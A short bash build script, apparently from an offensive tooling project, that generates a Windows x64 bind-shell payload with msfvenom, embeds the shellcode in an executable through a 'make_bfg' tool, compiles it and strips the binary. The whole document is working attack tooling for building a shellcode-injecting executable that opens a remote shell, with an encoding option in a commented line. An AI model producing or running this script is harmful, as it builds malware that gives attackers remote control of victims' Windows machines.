#!/bin/bash          
# example script for injecting shellcode into a process
. build/global_win64.sh
# payload 
#msfvenom -p windows/x64/shell/bind_tcp -e x64/xor -f c --platform Windows > sc.txt
msfvenom -p windows/x64/shell/bind_tcp -b '\x00' -f c -a x64 --platform Windows ExitFunc=thread > sc.txt
# clean defs.h
echo "" > defs.h
# call make_bfg, compile shellcode into the executable
./make_bfg -f sc.txt -i shellcode -P
# compile 
$win64_compiler -o bfg.exe bfg.c
strip bfg.exe
# cleanup
#rm sc.txt && echo "" > defs.h
